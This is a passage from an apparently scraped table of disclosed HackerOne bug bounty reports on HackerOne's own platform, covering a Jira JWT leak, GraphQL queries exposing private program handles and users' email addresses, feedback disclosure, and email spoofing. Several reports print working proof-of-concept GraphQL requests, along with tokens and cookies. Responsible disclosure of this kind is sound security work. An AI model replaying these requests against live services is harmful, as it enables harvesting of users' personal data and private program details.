Send the request and you will see ""was_successful"":true

So you didn't leave the 2nd program but you got a new pending invitation.
Note: Sometimes, I see ""was_successful"":true in response but to be honest, I don't know why.
Yesterday, I sent about 25-30 request with different private programs and I asked how much pending invitations do I have? to support@hackerone.com and they said It looks like you currently have 19 pending invitations at this time..
That's why I wanted to report it.
Impact
Users can get invitations without leaving programs.2 attachments:F1022548: 1.pngF1022553: 2.pngSummary by aliBe creative :)
https://twitter.com/alicanact60",https://hackerone.com/reports/999789,California,United States,San Francisco,2020,10,6,14,4
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,5.45,Business Logic Errors,Hackerone is not properly deleting user id,"bc61a6bcad5cbde580710c4  submitted a report to HackerOne.Mar 23rd (2 years ago)Summary:
Long  ago, i had an account on hackerone that is now deleted.
I used the alias email provided by h1 to sigbup on a site for bug testing.
To my surprise, i receive an email to my account routed from an alias email that should not exist.
Description:
Steps To Reproduce

SignUp on H1
Use h1 alias email to signup on some website
Delete h1 account and the email still exists

Optional: Your Environment (Browser version, Device, etc)



Optional: Supporting Material/References (Screenshots)

as you can see.the email i just received. You can check your database that █████ dont exist in your database coz I deleted the account long back..but you can see the email address
.


███████
Impact
Privacy concern",https://hackerone.com/reports/1133118,California,United States,San Francisco,2021,3,23,16,28
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,4.8,Improper Authentication - Generic,HackerOne Jira integration plugin Leaked JWT to unauthorized jira users,"updatelap  submitted a report to HackerOne.Feb 15th (2 years ago)Summary:
HackerOne provides an application tool HackerOne for Jira, an application that allows programs to track security issues through a jira instance. After testing the integration feature in the application, it was found that the application leads to the leakage of the JWT to unauthorized users.
About jira:
Jira Cloud allows the system administrator to add users with different Roles such as ""Basic, Trusted, and Site administrator"" with the highest authority being ""Site administrator"" and least ""Basic"". Based on these Roles allows:

The administrator can fully manage the account by accessing all projects, issues, dashboards and configuring applications.
Access to specific projects or issues. It is not possible to access to configure applications or to change any of the account settings.

Description:
As we mentioned earlier, the HackerOne for Jira application, after installing it, creates an integration between the HackerOne platform and the atlassian where cases can be synchronized from HackerOne to atlassian
And vice versa. So, after installation, administrators  jira account is allowed to go https://YOUDOMIN.atlassian.net/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira When going to this page, the following message will appear:
Image F1196098: H1PlugConf.png 37.89 KiBZoom in Zoom out Copy Download
When you click on ""click here"", you will be directed to a link  this ""https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>"" containing JWT parameter to complete the integration process. So. Based on the About jira description, an employee with ""BSSIC"" privileges is not allowed to access the application configuration.  After testing if the HackerOne for Jira app. checks the permissions of Jira users before providing the user with the JWT, it is found that the  [HackerOne for Jira] application does not verify the user's permissions and generates the JWT code for a user with basic privileges. This allows this malicious user to link their hackerone account to an instance of a jira that they do not own. Which leads, for example, to leak names of private projects or create issues in private projects .. etc
Image F1196129: BasicVsAdmin.png 87.04 KiBZoom in Zoom out Copy Download
The normal or expected behavior that the tool should work with is to verify the role of the user who requests the configuration page, and if he does not have the privilege to display the page, a message similar to this should appear.
Image F1196135: NormBe.png 25.64 KiBZoom in Zoom out Copy Download
Steps To Reproduce

Go to Jira cloud and create jira instance.
Add user with Basic roles.
The administrator creates 8 projects and is restricted to accessing 5 projects for the administrator only.
Admin Install HackerOne for Jira app.
User Go to {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
User steals a hackerone generated configuration link https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN> and uses it to link a Jira instance to their hackerone account
Now user can create issue in private project or linked H1 report with private issue project.

PoC H1PoC.mp4 (F1196168)
Impact

attacker can Create issue in priavet jira Project
attacker can Leaked priavet jira Project name.
When an administrator tries to link an instance of jira to the H1 account, they will not be able to because the instance has been linked to the attacking H1 account 

Image F1196177: DoS.png 35.80 KiBZoom in Zoom out Copy Download

Injecting comments on private issues into private jira projects.
Linking private jira issues with attacker H1 report
5 attachments:F1196098: H1PlugConf.pngF1196129: BasicVsAdmin.pngF1196135: NormBe.pngF1196168: H1PoC.mp4F1196177: DoS.pngbugseeker   posted a comment. Feb 16th (2 years ago)Hi @updatelap,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@bugseeker bugseeker   posted a comment. Feb 16th (2 years ago)Hi @updatelap
I have forwarded your report to the internal team. I will keep you updated.
Regards,
@bugseeker 
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  changed the status to Triaged. Feb 19th (2 years ago)Hi @updatelap - thanks for your report! I've forwarded this to the engineering team that is responsible for this integration. They'll help us confirm if this is a security vulnerability / risk. We'll get back to you soon.jobert HackerOne staff  updated the severity from medium (6.4) to medium (4.8). Feb 24th (2 years ago)HackerOne  rewarded updatelap with a $2,500 bounty. Feb 24th (2 years ago)Hi @updatelap - really cool find, we hadn't seen something like this before! The team confirmed the vulnerability and released an update for the Jira app. Existing HackerOne customers who have the app installed are notified that there's an update available. We look forward to receive more reports from you in the future. Happy hacking!jobert HackerOne staff  changed the status to Retesting. Updated Feb 24th (2 years ago)updatelap   completed a retest. Feb 24th (2 years ago)Retest finding resultAre you able to reproduce the vulnerability report?No, the fix works.Please provide a short summary with the results of your retestHey @jobert 
Thank you for your response and your hard work on this report and thanks for reward. I retested this issue and it turned out that the vulnerability was already patched. As it is now allowed access to the authorizations page only for employees with ""Admin and trusted"" role.
Best,
JafarHackerOne  awarded $50 to updatelap for completing the retest. Feb 24th (2 years ago)Sweet, thanks for confirming the fix, @updatelap!jobert HackerOne staff  closed the report and changed the status to Resolved. Feb 24th (2 years ago)updatelap   requested to disclose this report. Feb 24th (2 years ago)Thanks @jobert, Is it possible to disclose the report in a limited way ??
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  posted a comment. Mar 3rd (2 years ago)Hi @updatelap - all resolved reports get fully disclosed by default. Is there particular information you'd like to redact in the report? We're happy to remove anything you prefer not to be disclosed, as long as the report is still readable and understandable. Let me know!updatelap   posted a comment. Mar 4th (2 years ago)Hey Mr. @jobert, 
Thank you for reply and hard work on this report. I have completely retested the integration process again and found some interesting things that I would like to share with you. As I mentioned in my previous response, after your reform process, only the employees who are authorized to access the integration page are employees who have ""admin and trusted"" permissions.
At first, I created several projects from the ""administrator"" account, then went to the permission settings and restricted access to any project dashboard, or issue.. Etc, for the administrator only.
Image F1217713: siteAdmin.png 161.17 KiBZoom in Zoom out Copy Download
Now this means that any user with any permissions will not be able to view projects or issues except for the administrators group
Then I implemented the same scenario as the previous one, but this time by using an employee with ""trusted"" privileges. When the employee with ""trusted"" permissions obtained the ""https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>"" integration link, 

He can reveal the names of all the private projects in the Jira account.
A user with ""trusted"" permissions can also post issues to projects that he or she has no access to.
Leaked comment in private issue.
Add comment in private issue.

I think the main bug is because your Jira app creates a JWT based on the app’s privileges and not based on the user’s privileges. To fundamentally solve this issue, the HackerOne Jira Jira application must first verify the permissions of the user who requests this page {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-JIRA and based on the permissions The visitor is provided with a JWT suitable for his privileges in order not to cause conflict and data leakage. Or, make access to the page {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira for the administrator only
I found that this matter is a file of concern and should be shared with you, and I think it was not taken into consideration in the previous reform.
Best,
Jafar1 attachment:F1217713: siteAdmin.pngupdatelap   posted a comment. Mar 4th (2 years ago)When entering the integration page, the HackerOne server sends the JWT value. If you refresh the page several times from the “admin” account and the “trusted” account and take the JWT value each time, you will notice that the values ​​for the “admin” and “trusted” account are created correctly, where the admin value is Linked to its ID, and the JWT for Trusted is related to its ID.
Admin user JWT
Code 347 BytesWrap lines Copy Download1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI1Zjg1ODk0Yzc0NDFlYTAwNjgwZjA3MjAiLCJxc2giOiI3YTczODdkYTdhZWI0NGY2NmRjNDU5N2Q2NzVmMTI2NjkwNTkwNDUxMThmMTg5NDZmM2Q0MDZjZGFiODM5M2M2IiwiaXNzIjoiODA0ZGJlNDEtNDM3NC0zZTIyLWFhOGQtMGRmOGYyMDNkZWNmIiwiY29udGV4dCI6e30sImV4cCI6MTYxNDg4MDg3OSwiaWF0IjoxNjE0ODc5OTc5fQ.wNkoUlzjGzbSZUr683GeTsqTecHffdHnLpvo5GDezMA
Payload Data admin
Code 224 BytesWrap lines Copy Download1{
2  ""sub"": ""5f85894c7441ea00680f0720"",
3  ""qsh"": ""7a7387da7aeb44f66dc4597d675f12669059045118f18946f3d406cdab8393c6"",
4  ""iss"": ""804dbe41-4374-3e22-aa8d-0df8f203decf"",
5  ""context"": {},
6  ""exp"": 1614880879,
7  ""iat"": 1614879979
8}
Trusted user JWT
Code 347 BytesWrap lines Copy Download1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI1ZjkyZjg1YjM3NmE1NzAwNmExOWI4YzYiLCJxc2giOiI3YTczODdkYTdhZWI0NGY2NmRjNDU5N2Q2NzVmMTI2NjkwNTkwNDUxMThmMTg5NDZmM2Q0MDZjZGFiODM5M2M2IiwiaXNzIjoiODA0ZGJlNDEtNDM3NC0zZTIyLWFhOGQtMGRmOGYyMDNkZWNmIiwiY29udGV4dCI6e30sImV4cCI6MTYxNDg3NTExMiwiaWF0IjoxNjE0ODc0MjEyfQ.n0GlQK4y0ONmmeI_1jYWwjLeAcWLyAqsDhcUuVVVqjA
Payload Data Trusted:
Code 224 BytesWrap lines Copy Download1{
2  ""sub"": ""5f92f85b376a57006a19b8c6"",
3  ""qsh"": ""7a7387da7aeb44f66dc4597d675f12669059045118f18946f3d406cdab8393c6"",
4  ""iss"": ""804dbe41-4374-3e22-aa8d-0df8f203decf"",
5  ""context"": {},
6  ""exp"": 1614875112,
7  ""iat"": 1614874212
8}
This means that the HackerOne server is correctly generating the JWT values. But it seems that the server does not verify the validity of the JWT access for each user, as the server deals with all JWTs with the same level of permissions. Which leads to misuse and leakage of data.
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  posted a comment. Mar 9th (2 years ago)Hi @updatelap - thanks for the additional information, that's useful. When reading it though I'm wondering if this is an issue on Jira's side 🤔 Have you seen other companies suffering from the same vulnerability in their Jira app? If so, how did they remediate it? Thanks!updatelap   posted a comment. Mar 9th (2 years ago)Hey
I had this problem previously with several apps. The developers simply prevented the server from providing the user with the JWT code and made access to the integration page restricted to the administrator only. This hacker will work with the HackerOne Jira app, but I believe that this is not the main cause of your application problem.
As I mentioned previously, the server is generating the JWT token correctly, but the defect is the server's way of requesting data. This means that if we go to the ""authentication"" page, the admin or trusted user will be provided with his JWT code.
Image F1223535: connect-oauth-impersonation-flow.png 162.45 KiBZoom in Zoom out Copy Download
After that, if you click on this link and monitor the network requests, you will notice that all requests are sent to the HackerOne server and there is no request sent to ""Atlassian"". Which means that dealing with the Atlassian cloud is done by a HackerOne server. To identify the problem more clearly, I went back to the beginning of my HackerOne of the HackerOne app and noticed that when I installed an app. When I went to the Audit Log page ""https: //<YourSite>.atlassian.net/auditing/view/page/"" I noticed that when I installed the H1 Jira application, the application created and linked a new user in my account with the name ""comh"" and has System Admin privileges. Therefore, I think that the H1 server, on the server side, depends on the authorizations of the ""comh"" employee to fetch information and not on the authorizations of the trusted employee or responsible
So, can you be sure which employee relies on H1 to fetch information. If I had the wrong prediction, you can only restrict access to the integration page for the administrator only.
On the server side, you can use atlassian's REST API to make sure of the powers of each employee, and accordingly you process this information on the server and decide what information you want to return to the user while ensuring that no data is leaked.
Best
Jafar1 attachment:F1223535: connect-oauth-impersonation-flow.pngupdatelap   posted a comment. Mar 9th (2 years ago)Hey @jobert,
To answer your question and make sure that the defect is not on Jira's side. After creating an instance of Jira, adding the trust user, and restricting access to projects to the administrator only, as I indicated previously, you can make sure that Jira checks the powers correctly by sending the following requests from the user's trust account.
https://jiraxsstest.atlassian.net/rest/api/3/mypermissions?permissions=ADMINISTER_PROJECTS https://jiraxsstest.atlassian.net/rest/api/3/mypermissions?permissions=ADMINISTER
Image F1224296: TrustUSerPerm.png 39.43 KiBZoom in Zoom out Copy Download
The response will be as follows, as it indicates to you that he is actually the user with trust powers, but does not have the authority to manage projects.
Then you can send the following request to make sure that the user with the powers of the trust does not have the authority to browse the project or modify or create cases:
https://jiraxsstest.atlassian.net/rest/api/3/mypermissions?permissions=BROWSE_PROJECTS%2CEDIT_ISSUES
Image F1224301: EditAndBrows.png 21.91 KiBZoom in Zoom out Copy Download
You can also send the following request and the validity key that you want to inquire about through the following link: https://jiraxsstest.atlassian.net/rest/api/3/permissions
Best,
Jafar2 attachments:F1224296: TrustUSerPerm.pngF1224301: EditAndBrows.pngupdatelap   posted a comment. Mar 17th (2 years ago)Hi @jobert,
I apologize for the inconvenience. I appreciate your concern for the most important reports. I would like to ask if there is any update on this report.
Bestupdatelap   cancelled the request to disclose this report. Mar 20th (2 years ago)Hi 
Any Update here?bugseeker   posted a comment. Mar 21st (2 years ago)Hi @updatelap - We are still looking into this report and will update you when we have additional information to share. Thanks for your patience! 
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  posted a comment. Mar 25th (2 years ago)Hi @updatelap - thanks for the additional information! I've passed it along to the engineers. I suspect we'll have an update for you within a week. Thanks for your patience with us!updatelap   posted a comment. Mar 25th (2 years ago)Hi @jobert & @bugseeker - Thank you for your hard work. I appreciate your efforts and your time on this reportHackerOne  rewarded updatelap with a $500 bounty. Apr 1st (2 years ago)Hi @updatelap - thanks again! The team restricted this even further so that it can only be set up by system administrators, not administrators. We believe that this is a sufficient mitigation against the security vulnerability that you described. Because of the beautifully written report and great collaboration, we're awarding an additional $500 to thank you for your effort. Please let us know if you have any further thoughts on this!updatelap   requested to disclose this report. Apr 1st (2 years ago)Hey @jobert,
Thank you for your reply, Great job 👍,  thank you for your effort in this report and thanks for the additional bounty. I tried to access an Add-on using several levels of permissions and could not.
Best,
Jafar
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  agreed to disclose this report. Apr 1st (2 years ago)Thanks again, @updatelap, this was a great find!  This report has been disclosed. Apr 1st (2 years ago)updatelap   posted a comment. May 6th (2 years ago)Hi @jobert,
Wish you a happy day. I tried to communicate with you on your social media, and it seems that it does not provide these options directly. I want to contact with you about this report. In the beginning, you awarded me $2,500 for the initial report. After the reform, I discussed a way to bypass the first report, and you made a second reform and paid a second reward of $500.
Therefore, after more research, it became clear to me that I was not completely right and that I was wrong in the details that I attached to it to bypass the first reform. As it became clear to me based on Atlassian documents that the employee is allowed to have Trusted access to projects that the administrator has registered because he is the employee with Trusted powers and primarily has administrative powers. Therefore, based on the above, I believe that I do not deserve the second reward, which is valued at $ 500.
So if I can be told in a way that enables me to return the $500 to H1 because in Islam, I am not allowed to take it unlawfully.
I apologize for the inconvenience
Best,

Jafar",https://hackerone.com/reports/1103582,California,United States,San Francisco,2021,2,15,11,12
HackerOne,1001-5000,0.0,10m-50m,$500.00,Low,2.0,Information Disclosure,Information disclosure - Feedback is accessible on Public profile even after 'disallowed' at https://hackerone.com/settings/feedback,"brdoors3  submitted a report to HackerOne.Jul 15th (about 1 year ago)Summary:
Hi team,
I noticed one possible information disclosure scenario related to My Feedback managed at https://hackerone.com/settings/feedback
Description:
In current scenario even after uncheck the option ""Show this blurb on my profile"" I can access the feedback using one one  requestPOST /graphql HTTP/1.1 
Steps To Reproduce
1 I go to https://hackerone.com/settings/feedback 
I see one Feedback of program Legal Robot with option ""Show this blurb on my profile"" > I make sure that this option is not checked 
 ██████████
2 I access my account in incognito mode not logged in any Hackerone account
Using inspect element of browser search for feedback 
I find this request:
Code 3.31 KiBWrap lines Copy Download1POST /graphql HTTP/1.1
2Host: hackerone.com
3Connection: close
4Content-Length: 2218
5sec-ch-ua: "" Not;A Brand"";v=""99"", ""Google Chrome"";v=""91"", ""Chromium"";v=""91""
6accept: */*
7X-Auth-Token: ----
8sec-ch-ua-mobile: ?0
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
10content-type: application/json
11Origin: https://hackerone.com
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: https://hackerone.com/brdoors3?type=user
16Accept-Language: en-US,en;q=0.9
17Cookie: _cfuid=8e7b0719-b897-43ac-a3c4-a1da6de0de25; _ga=GA1.2.1354168190.1626382636; _gid=GA1.2.169172629.1626382636; __Host-session=Z3ZEcTkvM2YvSFYrV0dsSUFXdnpDb0gwdXdobytBUFFDbU5WM05oWkZOTVk2U2JmZGlsUStBeGcrRWVGak5Ybm9acWI2ZU1oNGU0OTZIMlpPOGdzZTN1T1pMZzZlMjlGZ2lSV3BaRGFsNHJ2ak96Uk5PekpMRnFMVVZYL2VFYlBiVmV4TEdXdzdDQWFyV2dKWDVqZ29YdmdLZUxSczhLaDdFZFVzL1A0ZzVxL1RGOHBVUlRldVFlZ0cvUVgvV25SNjNlb1lJU2p2Z2UzeDdSRi84Y2lRK2ZlZm91aGlpSW5aUVlMSVlNeVBEOUIrNmJOZU96VFFPT1lNM1VlKzNFNHJGZG4xTlFueFdHZURjMXZheVcxYzh6ZldxcGxJN1BXb29Ba3FKd2FHK0E9LS12RzlNUnV6NUNOQ0FhcHdMaU1SS1dRPT0%3D--b9e3da4a42bb5566ca041114dd6113434d3779bf
18
19{""operationName"":""UserProfilePage"",""variables"":{""resourceIdentifier"":""brdoors3""},""query"":""query UserProfilePage($resourceIdentifier: String!) {\n  me {\n    id\n    username\n    ...UserProfileSubheaderMe\n    ...UserProfileCardMe\n    ...UserStatsMe\n    __typename\n  }\n  user(username: $resourceIdentifier) {\n    id\n    username\n    name\n    intro\n    profileActivated: profile_activated\n    pentester_profile {\n      id\n      ...PentestsPentesterProfile\n      __typename\n    }\n    ...UserProfileSubheaderUser\n    ...UserProfileCardUser\n    ...CreditsUser\n    ...BadgesUser\n    ...ReviewUser\n    ...UserStatsUser\n    __typename\n  }\n}\n\nfragment UserProfileSubheaderMe on User {\n  id\n  username\n  __typename\n}\n\nfragment UserProfileSubheaderUser on User {\n  id\n  username\n  __typename\n}\n\nfragment UserProfileCardUser on User {\n  id\n  created_at\n  location\n  website\n  bio\n  name\n  username\n  profile_picture(size: large)\n  bugcrowd_handle\n  github_handle\n  gitlab_handle\n  linkedin_handle\n  twitter_handle\n  cleared\n  ...FollowUser\n  __typename\n}\n\nfragment FollowUser on User {\n  id\n  followed\n  __typename\n}\n\nfragment UserProfileCardMe on User {\n  id\n  __typename\n}\n\nfragment PentestsPentesterProfile on PentesterProfile {\n  id\n  completed_pentests_number\n  __typename\n}\n\nfragment CreditsUser on User {\n  id\n  username\n  resolved_report_count\n  thanks_item_count: thanks_items {\n    total_count\n    __typename\n  }\n  __typename\n}\n\nfragment BadgesUser on User {\n  id\n  username\n  badges(first: 3) {\n    edges {\n      awarded_at\n      node {\n        id\n        name\n        image_path\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReviewUser on User {\n  id\n  public_reviews(first: 5) {\n    edges {\n      node {\n        id\n        public_feedback\n        team {\n          id\n          name\n          handle\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment UserStatsUser on User {\n  id\n  username\n  __typename\n}\n\nfragment UserStatsMe on User {\n  id\n  __typename\n}\n""}
3 send the request
Response:
Code 4.04 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Thu, 15 Jul 2021 21:07:03 GMT
3Content-Type: application/json; charset=utf-8
4Connection: close
5Cache-Control: no-cache, no-store
6Content-Disposition: inline; filename=""response.""
7X-Request-Id: 2d322339-9159-4b49-88b3-0216758ad759
8ETag: W/""35e4f1f253173287718c90dfc1fcd49d""
9Set-Cookie: __Host-session=VFlXKzJTak9Zb2ZtUXpNdmhISDl1NFlydStpM3oxaWxmK1piU2lmeHprbHVxbUdpUk9nUWpITmtyMXg0SlhqVWF0TitTd0lWRVYxUXdEWjZoWmloVVozOHhYUDVaN3hhV09JZTAvcXhjV0VYT2kzNE1BQStkYnJBNnZXZFNxVDVmb3Nwdm1HWWpncEN6SHR0dDVEVS91QTZpVDlvb2F2QTZILytMb0xvZVpUcTR1WFlQWVdFenBxUDJjWFJWYzVGTXBSRjVudUpJeFU2bms1bklZRlVSS1JXSlBTNDBDUmFPeU9YOWVpSHVGYWdiR0c0SVoyUnlzaURZSW0rTTZONDgrL2lzSlc1VFl4VkhneU1yWUhkdFdFaDh4aGtVbXJoUkUrNStwVE9kUlU9LS1PQlRxVkpjTUZEWTFweEE5cUxVRTlnPT0%3D--640967a2e3cbce33415ccaf47fc90bbbaa94a86f; path=/; expires=Thu, 29 Jul 2021 21:07:03 GMT; secure; HttpOnly; SameSite=None
10Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
11X-Frame-Options: DENY
12X-Content-Type-Options: nosniff
13X-XSS-Protection: 1; mode=block
14X-Download-Options: noopen
15X-Permitted-Cross-Domain-Policies: none
16Referrer-Policy: strict-origin-when-cross-origin
17Expect-CT: enforce, max-age=86400
18Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com a5s.hackerone-ext-content.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=374aea95847f4040a69f9c8d49a3a59d
19CF-Cache-Status: DYNAMIC
20Server: cloudflare
21CF-RAY: 66f5f54a2be2f754-GRU
22Content-Length: 2060
23
24{""data"":{""me"":null,""user"":{""id"":""Z2lkOi8vaGFja2Vyb25lL1VzZXIvMTMwNDY3"",""username"":""brdoors3"",""name"":""Leandro Chaves"",""intro"":"""",""profileActivated"":true,""pentester_profile"":null,""__typename"":""User"",""created_at"":""2016-12-13T17:12:06.352Z"",""location"":"""",""website"":null,""bio"":""hi team, any update?"",""profile_picture"":""https://profile-photos.hackerone-user-content.com/variants/000/130/467/14c08e02f02a6d8a8ae224012965f50954389546_original.jpg/3a92d35ded291cb6603c042e6805cce06895beaa6e173fbe2dd001db123414cf"",""bugcrowd_handle"":""lccunha"",""github_handle"":"""",""gitlab_handle"":"""",""linkedin_handle"":"""",""twitter_handle"":""cecleandro"",""cleared"":true,""followed"":false,""resolved_report_count"":232,""thanks_item_count"":{""total_count"":54,""__typename"":""ThanksItemConnection""},""badges"":{""edges"":[{""awarded_at"":""2020-05-28T08:29:44.319Z"",""node"":{""id"":""Z2lkOi8vaGFja2Vyb25lL0JhZGdlLzQ4OA=="",""name"":""$100 Million Dollars in Bounties"",""image_path"":""https://hackathon-photos.hackerone-user-content.com/KEPkZQmZZFyPBYAen6JTsDPR"",""__typename"":""Badge""},""__typename"":""BadgesUsersEdge""},{""awarded_at"":""2020-03-31T20:09:59.153Z"",""node"":{""id"":""Z2lkOi8vaGFja2Vyb25lL0JhZGdlLzIy"",""name"":""Diversity"",""image_path"":""/assets/users/badges/diversity_gold-3f081a79ff0749d00cc329ce2ed66fe71e3bfe8fb0bfd24740a5d719ff13f58a.png"",""__typename"":""Badge""},""__typename"":""BadgesUsersEdge""},{""awarded_at"":""2019-08-22T07:37:17.951Z"",""node"":{""id"":""Z2lkOi8vaGFja2Vyb25lL0JhZGdlLzMw"",""name"":""Belle of the Ball"",""image_path"":""/assets/users/badges/popular-eee04dcea8d47d18996bfa4438a6c7d365146aa0c1417350608c903fb00ec28d.png"",""__typename"":""Badge""},""__typename"":""BadgesUsersEdge""}],""__typename"":""BadgesUsersConnection""},""public_reviews"":{""edges"":[{""node"":{""id"":""Z2lkOi8vaGFja2Vyb25lL0hhY2tlclJldmlldy83"",""public_feedback"":""Clear language \u0026 video proof - excellent report."",""team"":{""id"":""Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpMZWdhY3kvMTYwMQ=="",""name"":""Legal Robot"",""handle"":""legalrobot"",""__typename"":""Team""},""__typename"":""HackerReview""},""__typename"":""HackerReviewEdge""}],""__typename"":""HackerReviewsConnection""}}}}
Note:
``""public_feedback"":""Clear language \u0026 video proof - excellent report.""```
Image F1378277: h2.JPG 44.93 KiBZoom in Zoom out Copy Download
Impact
My Feedback is disclosed in one endpoint at user profile even after uncheck the option 'Show this blurb on my profile' at https://hackerone.com/settings/feedback1 attachment:F1378277: h2.JPG",https://hackerone.com/reports/1264725,California,United States,San Francisco,2021,7,15,21,9
HackerOne,1001-5000,0.0,10m-50m,$250.00,No value,0.0,Violation of Secure Design Principles,Email spoofing ,"introvertmac  submitted a report to HackerOne.Jan 10th (9 years ago)There are few email spoofing tool is available free.one them is 
http://emkei.cz/
when I tried to send a email from merjin@hackerone.com to my email ,it was successful but when i tried to send the another from manish@facebook.com , i did not receive any email.Hence, there might be some configuration missing in your mail servers (i am not much aware of technical details associated with this issue but would love to know how this is happening),Arice can explain this to me much better.
This can be dangerous ,as attacker can send some fake bounty amount to some hacker,then hacker will claim back for the money (a sample mail attached),can lead to reputation loss :)1 attachment:F2430: test.JPG",https://hackerone.com/reports/575,California,United States,San Francisco,2014,1,10,11,44
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,6.1,None,Disclosure handle private program with external link,"haxta4ok00  submitted a report to HackerOne.Jul 25th (about 1 year ago)Summary:
Hi team.
It looks like we can identify private programs that have an external link
Steps To Reproduce



Code 651 BytesWrap lines Copy Download1POST /graphql HTTP/1.1
2Host: hackerone.com
3Connection: close
4Content-Length: 168
5accept: */*
6X-Auth-Token: your_token
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
8content-type: application/json
9Origin: https://hackerone.com
10Sec-Fetch-Site: same-origin
11Sec-Fetch-Mode: cors
12Sec-Fetch-Dest: empty
13Accept-Encoding: gzip, deflate
14Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
15Cookie: your_cookie
16
17{""query"":""{teams(last:100,where:{_and:[{roles:is_has_published_external_program},{roles:is_private}]}){total_count,nodes{_id,handle,state,participants{total_count}}}}""}
Answer:
Code 270 BytesWrap lines Copy Download1{""data"":{""teams"":{""total_count"":153,""nodes"":[{""_id"":""███████"",""handle"":""████"",""state"":null,""participants"":null},.....REDACT....{""_id"":""49805"",""handle"":""security-test-ep-invite-only"",""state"":null,""participants"":null},""handle"":""█████"",""state"":null,""participants"":null}]}}}
As we can see program for proof : @security-test-ep-invite-only
If this is the correct answer, then there are a total of 153 private programs with external links
Thanks!
Impact
Disclosure handle private program with external link",https://hackerone.com/reports/1276992,California,United States,San Francisco,2021,7,25,5,37
HackerOne,1001-5000,0.0,10m-50m,"$8,500.00",High,8.3,Improper Authorization,Email address of any user can be queried on Report Invitation GraphQL type when username is known,"msdian7  submitted a report to HackerOne.Feb 11th (3 years ago)Summary:
Email  id  of all hackerone users disclosure
Description:
There is an flaw , with that i can get all hackerone users email id 
Steps To Reproduce

Invoke the below graphql call

POST /graphql HTTP/1.1
{""query"":""mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}"",""variables"":{""input_0"":{""report_id"":""Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE="",""email"":""██████████"",""username"":""jobert""}}}
you will get below response
Code 146 BytesWrap lines Copy Download1{""data"":{""addReportParticipant"":{""clientMutationId"":null,""was_successful"":true,""errors"":{""nodes"":[]},""invitation"":{""email"":""████"",""token"":null}}}}

to reproduce from your account, create one test program, and create one report for that program, get that report id
gid://hackerone/Report/626371 (here 626371 my test program's report id)  convert it into base 64, replace that id with the ""report_id"" in the above graphql query 
Done

Impact
PII disclosed",https://hackerone.com/reports/792927,California,United States,San Francisco,2020,2,11,5,53
HackerOne,1001-5000,0.0,10m-50m,"$1,000.00",Low,2.0,Privacy Violation,HackerOne Staging uses Production data for testing,"tk0  submitted a report to HackerOne.Nov 5th (about 1 year ago)Summary:
Today I received an email related to smart rewards from HackerOne. This included staging environment details, such as:
Code 110 BytesWrap lines Copy Download1sender: no-reply+staging@hackerone.com
2Privacy / Terms links pointing to domain: https://www.enorekcah.com/...
This basically tells us that HackerOne is using hacker data (real users) in their lower environment (STAGING). Usually this should be avoided and production data should not be copied into lower environments -> using live data for testing.
See attachment which holds a copy of received email: ████
Impact
Privacy issues related to customer/hacker data in HackerOne.
Cheers!
@tk0",https://hackerone.com/reports/1392511,California,United States,San Francisco,2021,11,5,17,15
HackerOne,1001-5000,0.0,10m-50m,$1.00,No value,0.0,None,HackerOne making payments in USDC (Coinbase stable coin),"arl_rose  submitted a report to HackerOne.Jun 8th (about 1 year ago)Summary:
Hello Everyone, My name is Ariel and I’m a manager in HackerOne’s community team.
As a part of a Hack Week project, HackerOne is now supporting payments via USDC, Coinbase’s stable coin. This has been a feature requested by many hackers, that we are now glad to announce as supported. More details below.
Description:
First of all, you might be wondering “What on earth is a Hack Week”?. Don’t worry my friend, I gotcha. 
